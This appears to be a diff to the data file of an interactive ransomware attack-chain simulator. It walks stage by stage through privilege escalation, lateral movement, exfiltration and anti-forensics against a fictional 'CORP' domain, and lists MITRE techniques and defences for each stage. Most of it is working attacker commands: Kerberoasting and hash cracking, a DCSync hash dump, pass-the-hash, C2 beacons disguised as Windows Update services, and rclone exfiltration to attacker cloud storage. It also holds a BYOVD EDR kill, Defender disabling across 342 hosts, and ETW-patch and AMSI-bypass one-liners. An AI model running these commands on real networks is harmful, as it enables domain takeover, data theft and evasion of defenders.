+{t:"c",x:"$ proxychains4 -q crackmapexec smb 10.10.2.50 -u user_alpha -p 'W!nterSecure2024'",d:300},
+{t:"a",x:"SMB 10.10.2.50 445 FS01 [+] CORP\\user_alpha (Pwn3d!) → LOCAL ADMIN",d:200},
+{t:"d",x:""},
+{t:"i",x:"[DISCOVERY COMPLETE — T+1h 15m]",d:100},
+{t:"i",x:"  345 hosts mapped: 2 DCs, 1 FS, 1 Backup, 1 SQL, 338 workstations",d:80},
+{t:"i",x:"  user_alpha: IT-Admin, Server-Operator, local admin on FS01",d:80},
+{t:"i",x:"  user_beta:  Domain Users (low privilege)",d:80},
+{t:"i",x:"  → Using user_alpha to map AD attack paths and escalate",d:80},
+]}],
+N:{attacker:"active",firewall:"compromised",lan:"compromised",ad:"target",fs:"target"},
+I:[{l:"Hosts Found",v:"345"},{l:"Creds Captured",v:"2 accounts"},{l:"Method",v:"Responder/LLMNR"},{l:"Privileges",v:"IT-Admin"},{l:"Local Admin On",v:"FS01"},{l:"Domain",v:"CORP"}],
+W:["Run BloodHound to map shortest path to Domain Admin","Kerberoast service accounts with weak encryption","DCSync to dump all domain password hashes"],
+T:["T1046 — Network Service Discovery","T1557.001 — LLMNR/NBT-NS Poisoning","T1110.002 — Password Cracking","T1087.002 — Domain Account Enumeration"],
+D:["Disable LLMNR/NBT-NS via GPO","Enforce SMB signing on ALL hosts","Deploy honeypots with fake credentials","LAPS for unique local admin passwords","Monitor for unusual SMB auth failures"]
+},
+
+// ━━━ STAGE 4: PRIVILEGE ESCALATION ━━━
+// Real flow: With IT-Admin creds, attacker maps AD with BloodHound,
+// finds Kerberoastable path to DCSync rights, achieves full domain compromise.
+{id:"privesc",nm:"Privilege Escalation",ic:"👑",m:"TA0004",sub:"AD Attack Path: Kerberoast → DCSync → Domain Admin",
+ds:"BloodHound reveals a 3-hop attack path from user_alpha to Domain Admin: user_alpha (IT-Admins group) has GenericAll over SVC_SQLDB service account → SVC_SQLDB has an SPN registered (Kerberoastable with RC4) → SVC_SQLDB has DCSync rights (Replicating Directory Changes). The attacker requests the TGS ticket, cracks the RC4 hash offline, then uses DCSync to dump every domain password hash.",
+ob:"<b>GOAL:</b> Achieve Domain Admin: (1) Map AD with BloodHound, (2) Kerberoast SVC_SQLDB, (3) Crack TGS hash, (4) DCSync all 1,247 domain hashes, (5) Pass-the-Hash to SYSTEM on DC01.",
+tl:"attacker@c2-host:~$ [CORP\\user_alpha]",
+P:[
+{nm:"BloodHound AD Mapping",C:[
+{t:"cc",x:"# ═══ MAP AD ATTACK PATHS WITH BLOODHOUND ═══"},
+{t:"cc",x:"# BloodHound collects: users, groups, computers, ACLs, sessions, GPOs"},
+{t:"cc",x:"# Then calculates shortest paths to Domain Admin"},
+{t:"c",x:"$ proxychains4 -q bloodhound-python -u user_alpha -p 'W!nterSecure2024' -d corp.dawnridge.example -ns 10.10.1.10 -c All --zip",d:450},
+{t:"o",x:"INFO: Connecting to LDAP server: DC01.corp.dawnridge.example",d:150},
+{t:"o",x:"INFO: Users: 1,247 | Groups: 89 | Computers: 342 | GPOs: 23 | ACLs: 12,445",d:250},
+{t:"s",x:"[+] Data collected → bloodhound_data.zip",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# BloodHound analysis reveals 3-hop path to DA:"},
+{t:"a",x:"╔═══════════════════════════════════════════════════════════╗",d:80},
+{t:"a",x:"║            SHORTEST PATH TO DOMAIN ADMIN                  ║",d:80},
+{t:"a",x:"╠═══════════════════════════════════════════════════════════╣",d:80},
+{t:"a",x:"║ user_alpha ──[MemberOf]──> IT-Admins                      ║",d:80},
+{t:"a",x:"║     └──[GenericAll]──> SVC_SQLDB                          ║",d:80},
+{t:"a",x:"║            ├── SPN: MSSQLSvc/SQL01:1433                   ║",d:80},
+{t:"a",x:"║            ├── Kerberoastable: YES (RC4_HMAC_MD5)         ║",d:80},
+{t:"a",x:"║            └──[GetChangesAll]──> DC01 → DOMAIN ADMIN      ║",d:80},
+{t:"a",x:"╚═══════════════════════════════════════════════════════════╝",d:80},
+{t:"i",x:"[+] Attack plan: Kerberoast SVC_SQLDB → crack → DCSync",d:250},
+]},
+{nm:"Kerberoast & Crack TGS",C:[
+{t:"cc",x:"# ═══ KERBEROAST: REQUEST TGS TICKET FOR SVC_SQLDB ═══"},
+{t:"cc",x:"# Any domain user can request a TGS for any SPN."},
+{t:"cc",x:"# The TGS is encrypted with the service account's RC4 hash (etype 23)."},
+{t:"cc",x:"# RC4 is FAST to crack offline — ~800 MH/s on a single GPU."},
+{t:"c",x:"$ proxychains4 -q python3 GetUserSPNs.py corp.dawnridge.example/user_alpha:'W!nterSecure2024' -target-user SVC_SQLDB -request -outputfile tgs.hash",d:400},
+{t:"o",x:"ServicePrincipalName       Name        MemberOf",d:80},
+{t:"o",x:"MSSQLSvc/SQL01:1433        SVC_SQLDB   CN=SQL Admins",d:80},
+{t:"o",x:"$krb5tgs$23$*SVC_SQLDB$CORP.DAWNRIDGE.EXAMPLE$...",d:80},
+{t:"a",x:"[+] TGS-REP hash saved → etype 23 (RC4_HMAC_MD5)",d:200},
+{t:"d",x:""},
+{t:"c",x:"$ hashcat -m 13100 tgs.hash wordlist.txt -r best64.rule -O -w 3",d:350},
+{t:"o",x:"Speed: 823.6 MH/s | Progress: 71.4%",d:400},
+{t:"a",x:"$krb5tgs$23$*SVC_SQLDB$... : SqlServ3r2023!",d:200},
+{t:"s",x:"[+] SVC_SQLDB password cracked: SqlServ3r2023!",d:200},
+{t:"i",x:"[+] SVC_SQLDB has GetChangesAll → DCSync capable",d:200},
+]},
+{nm:"DCSync → Domain Admin",C:[
+{t:"cc",x:"# ═══ DCSYNC: DUMP ALL DOMAIN PASSWORD HASHES ═══"},
+{t:"cc",x:"# DCSync mimics domain controller replication (MS-DRSR DRSGetNCChanges)."},
+{t:"cc",x:"# With GetChangesAll rights, we pull the entire NTDS.dit remotely."},
+{t:"c",x:"$ proxychains4 -q secretsdump.py 'CORP/SVC_SQLDB:SqlServ3r2023!'@10.10.1.10 -just-dc",d:450},
+{t:"o",x:"[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)",d:300},
+{t:"a",x:"Administrator:500:aad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::",d:80},
+{t:"a",x:"krbtgt:502:aad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f:::",d:80},
+{t:"o",x:"SVC_SQLDB:1108:aad3b435b51404ee:...",d:80},
+{t:"o",x:"user_alpha:1107:aad3b435b51404ee:...",d:80},
+{t:"o",x:"... (1,247 accounts dumped)",d:150},
+{t:"w",x:"[!] krbtgt hash captured — Golden Ticket persistence possible",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# Validate DA access — Pass-the-Hash with Administrator NTLM"},
+{t:"c",x:"$ proxychains4 -q psexec.py CORP/Administrator@10.10.1.10 -hashes aad3b435b51404ee:e02bc503339d51f71d913c245d35b50b",d:350},
+{t:"o",x:"[*] Requesting shares on 10.10.1.10...",d:150},
+{t:"o",x:"[*] Found writable share ADMIN$",d:100},
+{t:"a",x:"C:\\Windows\\System32> whoami",d:150},
+{t:"a",x:"nt authority\\system",d:100},
+{t:"tb",x:"[+] ████ DOMAIN ADMIN ACHIEVED — FULL AD COMPROMISE ████",d:200},
+{t:"d",x:""},
+{t:"i",x:"[PRIVESC COMPLETE — T+2h 05m]",d:100},
+{t:"i",x:"  1,247 domain hashes dumped via DCSync",d:80},
+{t:"i",x:"  krbtgt hash → Golden Ticket persistence available",d:80},
+{t:"i",x:"  SYSTEM shell on DC01 via PsExec + Pass-the-Hash",d:80},
+{t:"i",x:"  → Deploying to key internal servers",d:80},
+]}],
+N:{attacker:"active",firewall:"compromised",lan:"compromised",ad:"compromised",fs:"target"},
+I:[{l:"Path",v:"3 hops"},{l:"Method",v:"Kerberoast→DCSync"},{l:"Hashes Dumped",v:"1,247"},{l:"krbtgt",v:"CAPTURED"},{l:"DC Access",v:"SYSTEM"},{l:"Golden Ticket",v:"POSSIBLE"}],
+W:["Move laterally to file servers and backup infrastructure","Deploy C2 beacons on critical hosts","Prepare data exfiltration infrastructure"],
+T:["T1558.003 — Kerberoasting","T1003.006 — DCSync","T1550.002 — Pass the Hash","T1078.002 — Domain Accounts"],
+D:["Monitor DCSync: Event ID 4662 + replication GUIDs","Enforce AES-only Kerberos (disable RC4 etype)","gMSA for service accounts (eliminates Kerberoasting)","Tiered admin model: PAW + Red Forest","Alert on BloodHound LDAP query patterns"]
+},
+
+// ━━━ STAGE 5: LATERAL MOVEMENT & STAGING ━━━
+// Real flow: After DA, attacker deploys C2 beacons and tools to multiple
+// key servers. This establishes redundant access and staging infrastructure
+// for exfiltration. They move via WinRM/PSExec with DA credentials.
+{id:"lateral",nm:"Lateral Movement",ic:"🕸️",m:"TA0008",sub:"Deploy C2 Beacons & Stage Infrastructure",
+ds:"With Domain Admin, the attacker moves laterally to all critical servers — DC02, FS01, BACKUP01, SQL01. They deploy C2 beacons disguised as Windows Update services for redundant access, enumerate shares and databases, and prepare the staging infrastructure for data exfiltration. Multiple footholds ensure the attack survives if one host is detected and isolated.",
+ob:"<b>GOAL:</b> (1) Establish C2 beacons on DC02, FS01, BACKUP01, SQL01, (2) Enumerate all sensitive data locations, (3) Prepare staging directory for exfiltration, (4) Identify backup infrastructure for later destruction.",
+tl:"CORP\\Administrator@DC01 C:\\>",
+P:[
+{nm:"Deploy C2 to Key Servers",C:[
+{t:"cc",x:"# ═══ LATERAL MOVEMENT: DEPLOY C2 BEACONS VIA WINRM ═══"},
+{t:"cc",x:"# WinRM (TCP 5985) is enabled on all servers — legitimate admin protocol."},
+{t:"cc",x:"# C2 beacon disguised as svchost_update.exe — looks like Windows Update."},
+{t:"d",x:""},
+{t:"c",x:'C:\\> $s = New-PSSession -ComputerName DC02,FS01,BACKUP01,SQL01 -Credential CORP\\Administrator',d:300},
+{t:"o",x:"[4] PSSession objects created → DC02, FS01, BACKUP01, SQL01",d:200},
+{t:"d",x:""},
+{t:"c",x:'C:\\> Invoke-Command -Session $s -ScriptBlock { mkdir C:\\ProgramData\\WindowsUpdate -Force | Out-Null }',d:200},
+{t:"c",x:'C:\\> $s | ForEach { Copy-Item C:\\tools\\beacon.exe -Destination C:\\ProgramData\\WindowsUpdate\\svchost_update.exe -ToSession $_ }',d:300},
+{t:"o",x:"beacon.exe → DC02, FS01, BACKUP01, SQL01 (C:\\ProgramData\\WindowsUpdate\\)",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# Create Windows service for persistence on each host"},
+{t:"c",x:'C:\\> Invoke-Command -Session $s -ScriptBlock {\n  sc.exe create "WindowsUpdateSvc" binPath= "C:\\ProgramData\\WindowsUpdate\\svchost_update.exe" start= auto DisplayName= "Windows Update Service"\n  sc.exe start "WindowsUpdateSvc"\n}',d:400},
+{t:"s",x:"[+] C2 beacon installed as service on DC02, FS01, BACKUP01, SQL01",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# Verify C2 callbacks from all 5 compromised hosts"},
+{t:"o",x:"C2 Panel: 5 beacons active",d:100},
+{t:"a",x:"  DC01     10.10.1.10  SYSTEM  [primary]",d:60},
+{t:"a",x:"  DC02     10.10.1.11  SYSTEM  [redundant DC]",d:60},
+{t:"a",x:"  FS01     10.10.2.50  SYSTEM  [file server — exfil source]",d:60},
+{t:"a",x:"  BACKUP01 10.10.2.51  SYSTEM  [backup server — destroy target]",d:60},
+{t:"a",x:"  SQL01    10.10.3.100 SYSTEM  [database — exfil source]",d:60},
+{t:"s",x:"[+] 5 C2 beacons active — redundant access established",d:200},
+]},
+{nm:"Enumerate Sensitive Data",C:[
+{t:"cc",x:"# ═══ ENUMERATE FILE SHARES & DATABASES ═══"},
+{t:"c",x:"C:\\> net view \\\\FS01 /all",d:250},
+{t:"a",x:"Finance$      Disk  [HIDDEN] Financial Reports",d:60},
+{t:"a",x:"HR$           Disk  [HIDDEN] Employee Records & PII",d:60},
+{t:"a",x:"Legal$        Disk  [HIDDEN] Contracts & Compliance",d:60},
+{t:"a",x:"Executive$    Disk  [HIDDEN] Board Strategy Docs",d:60},
+{t:"o",x:"Engineering   Disk  Source Code & Technical Docs",d:60},
+{t:"d",x:""},
+{t:"cc",x:"# Size each share"},
+{t:"c",x:'C:\\> powershell "\'Finance$\',\'HR$\',\'Legal$\',\'Executive$\' | %{ $s=(gci \\\\FS01\\$_ -r -ea silent | measure Length -s); Write-Host \\"$_ : $([math]::Round($s.Sum/1GB,1)) GB ($($s.Count) files)\\" }"',d:400},
+{t:"o",x:"Finance$    : 23.4 GB (14,832 files)",d:80},
+{t:"o",x:"HR$         : 6.0 GB  (8,456 files)",d:80},
+{t:"o",x:"Legal$      : 8.7 GB  (5,231 files)",d:80},
+{t:"o",x:"Executive$  : 4.1 GB  (2,108 files)",d:80},
+{t:"i",x:"[+] 42.2 GB across 4 hidden shares — 30,627 files total",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# Enumerate SQL databases"},
+{t:"c",x:'C:\\> sqlcmd -S SQL01 -E -Q "SELECT name, size*8/1024 AS MB FROM sys.master_files WHERE database_id > 4"',d:350},
+{t:"o",x:"ERP_Production     4,230 MB",d:80},
+{t:"o",x:"CRM_Database       1,890 MB",d:80},
+{t:"o",x:"HR_Payroll           780 MB",d:80},
+{t:"i",x:"[+] SQL01: 3 production databases (6.9 GB total)",d:200},
+]},
+{nm:"Map Backup Infrastructure",C:[
+{t:"cc",x:"# ═══ IDENTIFY ALL BACKUP/RECOVERY MECHANISMS ═══"},
+{t:"cc",x:"# Critical: must know EVERY backup location to destroy before encryption"},
+{t:"c",x:'C:\\> Invoke-Command -Computer BACKUP01 -ScriptBlock { Get-WBSummary }',d:300},
+{t:"o",x:"LastSuccessfulBackupTime : 2025-02-27 02:00:00",d:80},
+{t:"o",x:"LastBackupTarget         : E:\\WindowsImageBackup",d:80},
+{t:"o",x:"NumberOfVersions         : 14",d:80},
+{t:"a",x:"[+] BACKUP01: Windows Server Backup — 14 daily images on E:\\",d:200},
+{t:"d",x:""},
+{t:"c",x:'C:\\> Invoke-Command -Computer BACKUP01 -ScriptBlock { Get-Service Veeam* | Select Name,Status }',d:300},
+{t:"o",x:"VeeamBackupSvc       Running",d:80},
+{t:"o",x:"VeeamBrokerSvc       Running",d:80},
+{t:"a",x:"[+] Veeam Backup & Replication detected on BACKUP01",d:200},
+{t:"c",x:'C:\\> Invoke-Command -Computer BACKUP01 -ScriptBlock { dir F:\\VeeamBackup\\ }',d:250},
+{t:"o",x:"DC01_Daily.vbk          12.4 GB",d:80},
+{t:"o",x:"FS01_Daily.vbk          34.2 GB",d:80},
+{t:"o",x:"SQL01_Daily.vbk          8.1 GB",d:80},
+{t:"a",x:"[+] Veeam repository: F:\\VeeamBackup\\ — 54.7 GB of backups",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# Check for VSS snapshots on each server"},
+{t:"c",x:'C:\\> powershell "\'DC01\',\'DC02\',\'FS01\',\'SQL01\',\'BACKUP01\' | %{ $c=(Get-CimInstance Win32_ShadowCopy -Computer $_).Count; Write-Host \\"$_ : $c shadow copies\\" }"',d:400},
+{t:"o",x:"DC01: 3 shadow copies | FS01: 5 shadow copies | SQL01: 2 shadow copies",d:200},
+{t:"d",x:""},
+{t:"i",x:"[LATERAL MOVEMENT COMPLETE — T+2h 45m]",d:100},
+{t:"i",x:"  5 C2 beacons: DC01, DC02, FS01, BACKUP01, SQL01",d:80},
+{t:"i",x:"  Data targets: 42.2 GB file shares + 6.9 GB SQL databases",d:80},
+{t:"i",x:"  Backup targets: Veeam (54.7 GB), Windows Backup, VSS snapshots",d:80},
+{t:"i",x:"  → Proceeding to exfiltrate sensitive data",d:80},
+]}],
+N:{attacker:"active",firewall:"compromised",lan:"compromised",ad:"compromised",fs:"compromised"},
+I:[{l:"C2 Beacons",v:"5 active"},{l:"File Shares",v:"42.2 GB"},{l:"SQL Data",v:"6.9 GB"},{l:"Veeam Backups",v:"54.7 GB"},{l:"VSS Snapshots",v:"10"},{l:"Persistence",v:"WinSvc+SSH"}],
+W:["Exfiltrate sensitive data for double extortion leverage","Compress and encrypt before exfil to evade DLP","Use HTTPS to blend with normal egress traffic"],
+T:["T1021.006 — Remote Services: WinRM","T1543.003 — Create/Modify System Service","T1083 — File and Directory Discovery","T1135 — Network Share Discovery","T1069.002 — Domain Groups"],
+D:["Microsegment server VLANs with explicit allow rules","Alert on WinRM from non-admin workstations","Monitor for new services on domain controllers","Canary files in hidden shares","Behavioral EDR: detect enumeration patterns"]
+},
+
+// ━━━ STAGE 6: DATA EXFILTRATION ━━━
+// Real flow: Data theft happens BEFORE encryption for double extortion.
+// Attacker stages to a local directory, compresses with AES encryption,
+// then exfils via HTTPS to blend with normal traffic.
+{id:"exfil",nm:"Data Exfiltration",ic:"📤",m:"TA0010",sub:"Double Extortion — Steal Before Encrypt",
+ds:"Before deploying ransomware, the attacker exfiltrates 42.2 GB of sensitive data — financial records, HR/PII, legal documents, executive strategy. This stolen data is the leverage for double extortion: pay the ransom or it gets published on the leak site. Data is staged on DC01, compressed with AES-256 encryption, and exfiltrated via HTTPS to cloud storage — blending with normal web traffic.",
+ob:"<b>GOAL:</b> (1) Stage data from FS01 shares to DC01, (2) Compress with AES-256, (3) Exfiltrate via HTTPS to cloud storage, (4) Wipe staging area with secure overwrite.",
+tl:"CORP\\Administrator@DC01 C:\\>",
+P:[
+{nm:"Stage & Compress",C:[
+{t:"cc",x:"# ═══ STAGE DATA FROM FILE SERVER TO DC01 ═══"},
+{t:"cc",x:"# Staging directory mimics legitimate Windows crypto path"},
+{t:"c",x:"C:\\> mkdir C:\\ProgramData\\Microsoft\\Crypto\\RSA\\Cache",d:150},
+{t:"d",x:""},
+{t:"cc",x:"# Robocopy with /MT:16 threads, /ZB restartable+backup mode, no logging"},
+{t:"c",x:"C:\\> robocopy \\\\FS01\\Finance$ C:\\...\\Cache\\FIN /E /ZB /MT:16 /LOG:NUL",d:250},
+{t:"o",x:"Finance$...    23.4 GB [████████████████████] 100%",d:400},
+{t:"c",x:"C:\\> robocopy \\\\FS01\\HR$ C:\\...\\Cache\\HR /E /ZB /MT:16 /LOG:NUL",d:200},
+{t:"o",x:"HR$...          6.0 GB [████████████████████] 100%",d:300},
+{t:"c",x:"C:\\> robocopy \\\\FS01\\Legal$ C:\\...\\Cache\\LEG /E /ZB /MT:16 /LOG:NUL",d:200},
+{t:"o",x:"Legal$...       8.7 GB [████████████████████] 100%",d:300},
+{t:"c",x:"C:\\> robocopy \\\\FS01\\Executive$ C:\\...\\Cache\\EXEC /E /ZB /MT:16 /LOG:NUL",d:200},
+{t:"o",x:"Executive$...   4.1 GB [████████████████████] 100%",d:300},
+{t:"i",x:"[+] 42.2 GB staged on DC01",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# Compress + AES-256 encrypt, split into 500MB volumes"},
+{t:"c",x:'C:\\> 7z a -t7z -mx=9 -mhe=on -p"[REDACTED-KEY]" C:\\ProgramData\\exfil.7z C:\\...\\Cache\\* -v500m',d:350},
+{t:"o",x:"Compressing: 42.2 GB → 14.3 GB (29 × 500MB volumes)",d:300},
+{t:"s",x:"[+] Data compressed and AES-256 encrypted",d:200},
+]},
+{nm:"HTTPS Exfiltration",C:[
+{t:"cc",x:"# ═══ EXFILTRATE VIA HTTPS — BLENDS WITH NORMAL WEB TRAFFIC ═══"},
+{t:"cc",x:"# rclone uploads to cloud storage over port 443 — looks like normal HTTPS"},
+{t:"cc",x:"# Rate-limited to 50 MB/s to avoid bandwidth anomaly alerts"},
+{t:"c",x:'C:\\> rclone copy C:\\ProgramData\\exfil.7z.* remote:bucket-07/ --transfers 4 --bwlimit 50M --progress',d:350},
+{t:"o",x:"Transferring 29 files (14.3 GiB)...",d:200},
+{t:"o",x:"  14.3 GiB / 14.3 GiB, 100%, 47.2 MiB/s, ETA 0s",d:600},
+{t:"o",x:"Elapsed: 5m 11s | Transferred: 29/29 | Errors: 0",d:100},
+{t:"s",x:"[+] 42.2 GB exfiltrated to attacker-controlled cloud storage",d:200},
+]},
+{nm:"Staging Cleanup",C:[
+{t:"cc",x:"# ═══ WIPE STAGING EVIDENCE ═══"},
+{t:"cc",x:"# cipher /w does 3-pass overwrite (0x00, 0xFF, random) on free space"},
+{t:"c",x:"C:\\> rmdir /s /q C:\\ProgramData\\Microsoft\\Crypto\\RSA\\Cache",d:150},
+{t:"c",x:"C:\\> del /q C:\\ProgramData\\exfil.7z.*",d:150},
+{t:"c",x:"C:\\> cipher /w:C:\\ProgramData\\",d:200},
+{t:"o",x:"Writing 0x00 ... Writing 0xFF ... Writing random ...",d:300},
+{t:"s",x:"[+] Staging area wiped — 3-pass secure overwrite complete",d:200},
+{t:"d",x:""},
+{t:"tb",x:"[+] ████ 42.2 GB EXFILTRATED — DOUBLE EXTORTION LEVERAGE SECURED ████",d:200},
+{t:"d",x:""},
+{t:"i",x:"[EXFILTRATION COMPLETE — T+3h 15m]",d:100},
+{t:"i",x:"  42.2 GB stolen: Finance, HR/PII, Legal, Executive strategy",d:80},
+{t:"i",x:"  Encrypted with AES-256 + exfiltrated over HTTPS",d:80},
+{t:"i",x:"  Staging evidence securely wiped",d:80},
+{t:"i",x:"  → Proceeding to neutralize defenses before encryption",d:80},
+]}],
+N:{attacker:"active",firewall:"compromised",lan:"compromised",ad:"compromised",fs:"compromised"},
+I:[{l:"Data Stolen",v:"42.2 GB"},{l:"Files",v:"30,627"},{l:"Shares Hit",v:"4 hidden"},{l:"Exfil Method",v:"HTTPS/rclone"},{l:"Exfil Time",v:"5m 11s"},{l:"Staging",v:"WIPED"}],
+W:["Neutralize all endpoint security (EDR, AV, Sysmon)","Destroy all forensic evidence across every system","Clear event logs to blind incident response"],
+T:["T1039 — Data from Network Shared Drive","T1074.002 — Remote Data Staging","T1560.001 — Archive via Utility (7z)","T1567.002 — Exfil to Cloud Storage","T1070.004 — File Deletion"],
+D:["DLP with TLS inspection at egress proxy","Alert on bulk file access (>1GB from file shares)","Block unauthorized cloud storage domains","Data classification + sensitivity labels","Canary files that trigger alerts on access"]
+},
+
+// ━━━ STAGE 7: ANTI-FORENSICS & COUNTER-IR ━━━
+// Real flow: Right before ransomware deployment, attacker systematically
+// destroys ALL forensic evidence. This is the "scorched earth" phase.
+// Order matters: kill EDR first (or it alerts on everything else),
+// then blind telemetry (ETW/AMSI), then clear logs, then filesystem artifacts.
+{id:"antiforensics",nm:"Anti-Forensics",ic:"🧹",m:"TA0005",sub:"Evidence Destruction & Counter-IR",
+ds:"The penultimate phase before encryption. The attacker systematically destroys ALL forensic evidence across every compromised system. The order is critical: (1) Kill EDR/AV first — or it alerts on subsequent actions, (2) Patch ETW/AMSI to blind telemetry pipeline, (3) Clear all Windows Event Logs, (4) Destroy filesystem artifacts (Prefetch, USN Journal, ShimCache, AmCache, PowerShell history, RDP cache). Goal: even if IR teams respond, they find zero evidence trail.",
+ob:"<b>GOAL:</b> Total evidence destruction: (1) Kill EDR/AV domain-wide via BYOVD, (2) Patch ETW + bypass AMSI in-memory, (3) Disable Sysmon, (4) Clear all 437 event log channels, (5) Destroy: Prefetch, USN Journal, ShimCache, AmCache, PS history, RDP cache, (6) Timestomp attacker tools.",
+tl:"CORP\\Administrator@DC01 C:\\>",
+P:[
+{nm:"EDR/AV Kill (Domain-Wide)",C:[
+{t:"cc",x:"# ═══ PHASE 1: NEUTRALIZE ALL ENDPOINT SECURITY ═══"},
+{t:"cc",x:"# Must kill EDR/AV FIRST — or they alert on log clearing and tool deployment"},
+{t:"d",x:""},
+{t:"c",x:'C:\\> powershell "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select displayName"',d:250},
+{t:"o",x:"displayName",d:60},
+{t:"o",x:"Windows Defender",d:60},
+{t:"o",x:"CrowdStrike Falcon Sensor",d:60},
+{t:"w",x:"[!] CrowdStrike + Defender detected — BYOVD required for CrowdStrike",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# Step 1: Disable Windows Defender + add global exclusions"},
+{t:"c",x:'C:\\> powershell "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true"',d:300},
+{t:"c",x:'C:\\> powershell "Set-MpPreference -ExclusionPath \'C:\\\' -ExclusionExtension \'.exe\',\'.dll\',\'.ps1\',\'.bat\'"',d:250},
+{t:"a",x:"[+] Defender: real-time OFF, full drive exclusion set",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# Step 2: BYOVD — Load signed vulnerable driver for kernel access"},
+{t:"cc",x:"# Vulnerable driver gives kernel R/W → strip EDR kernel callbacks"},
+{t:"c",x:'C:\\> sc create KillSvc type=kernel binpath=C:\\ProgramData\\vuln_driver.sys',d:250},
+{t:"o",x:"[SC] CreateService SUCCESS (signed vulnerable driver loaded)",d:150},
+{t:"c",x:"C:\\> sc start KillSvc",d:150},
+{t:"c",x:"C:\\> edr_killer.exe --driver KillSvc --target csfalconservice",d:300},
+{t:"o",x:"[*] Removing: PsSetCreateProcessNotifyRoutine callback",d:100},
+{t:"o",x:"[*] Removing: PsSetCreateThreadNotifyRoutine callback",d:100},
+{t:"o",x:"[*] Removing: PsSetLoadImageNotifyRoutine callback",d:100},
+{t:"o",x:"[*] Removing: CmRegisterCallbackEx callback",d:100},
+{t:"a",x:"[+] CrowdStrike kernel callbacks STRIPPED — agent blinded",d:200},
+{t:"c",x:"C:\\> taskkill /F /IM CSFalconService.exe /IM CSFalconContainer.exe 2>nul",d:200},
+{t:"a",x:"[+] CrowdStrike processes TERMINATED",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# Step 3: Permanently disable Defender via registry"},
+{t:"c",x:'C:\\> reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',d:200},
+{t:"c",x:'C:\\> reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend" /v Start /t REG_DWORD /d 4 /f',d:200},
+{t:"a",x:"[+] Defender registry-disabled (survives reboot)",d:150},
+{t:"d",x:""},
+{t:"cc",x:"# Step 4: Push EDR/AV kill to ALL 342 domain computers"},
+{t:"c",x:'C:\\> Invoke-Command -ComputerName (Get-ADComputer -Filter *).Name -ScriptBlock {\n  Set-MpPreference -DisableRealtimeMonitoring $true -ExclusionPath "C:\\"\n  taskkill /F /IM CSFalconService.exe 2>$null\n} -ErrorAction SilentlyContinue',d:500},
+{t:"o",x:"Executing on 342 computers...",d:500},
+{t:"a",x:"[+] Endpoint security KILLED on ALL 342 domain computers",d:200},
+]},
+{nm:"Blind Telemetry (ETW/AMSI/Sysmon)",C:[
+{t:"cc",x:"# ═══ PHASE 2: BLIND THE TELEMETRY PIPELINE ═══"},
+{t:"cc",x:"# ETW (Event Tracing for Windows) underpins ALL Windows security logging."},
+{t:"cc",x:"# Patching ntdll!EtwEventWrite in-memory to RET (0xC3) prevents any"},
+{t:"cc",x:"# event generation — Defender ATP, Sysmon, PS logging all go dark."},
+{t:"d",x:""},
+{t:"c",x:'C:\\> powershell -c "$m=[Ref].Assembly.GetType(\'System.Runtime.InteropServices.Marshal\');$h=[Microsoft.Win32.UnsafeNativeMethods].GetMethod(\'GetModuleHandle\').Invoke($null,@(\'ntdll\'));$a=[Microsoft.Win32.UnsafeNativeMethods].GetMethod(\'GetProcAddress\',[type[]]@([IntPtr],[string])).Invoke($null,@($h,\'EtwEventWrite\'));$m::WriteByte($a,0xC3)"',d:400},
+{t:"a",x:"[+] ETW PATCHED: EtwEventWrite → 0xC3 (RET) — no events generated",d:250},
+{t:"d",x:""},
+{t:"cc",x:"# Bypass AMSI (Anti-Malware Scan Interface) — prevents script content scanning"},
+{t:"c",x:'C:\\> powershell -c "$r=[Ref].Assembly.GetType(\'System.Management.Automation.Amsi\'+\'Utils\');$f=$r.GetField(\'amsiInit\'+\'Failed\',\'NonPublic,Static\');$f.SetValue($null,$true)"',d:350},
+{t:"a",x:"[+] AMSI BYPASSED — all content scans return AMSI_RESULT_CLEAN",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# Disable PowerShell ScriptBlock and Module logging"},
+{t:"c",x:'C:\\> reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f',d:200},
+{t:"c",x:'C:\\> reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 0 /f',d:200},
+{t:"a",x:"[+] PowerShell logging DISABLED (ScriptBlock + Module)",d:150},
+{t:"d",x:""},
+{t:"cc",x:"# Kill Sysmon: stop service → unload minifilter driver → delete binary"},
+{t:"c",x:"C:\\> sc stop Sysmon64 && sc config Sysmon64 start=disabled 2>nul",d:200},
+{t:"c",x:"C:\\> fltMC unload SysmonDrv 2>nul",d:200},
+{t:"c",x:'C:\\> del /f "C:\\Windows\\Sysmon64.exe" 2>nul',d:150},
+{t:"a",x:"[+] Sysmon: service stopped, driver unloaded, binary deleted",d:200},
+{t:"s",x:"[+] Telemetry pipeline DESTROYED: ETW, AMSI, PS logging, Sysmon",d:200},
+]},
+{nm:"Event Log Wipe (Domain-Wide)",C:[
+{t:"cc",x:"# ═══ PHASE 3: CLEAR ALL WINDOWS EVENT LOGS ═══"},
+{t:"cc",x:"# Event logs are #1 evidence source for IR teams."},
+{t:"cc",x:"# Clear every log channel on every machine, then disable the service."},
+{t:"d",x:""},
+{t:"cc",x:"# Clear all 437 log channels on DC01 first"},
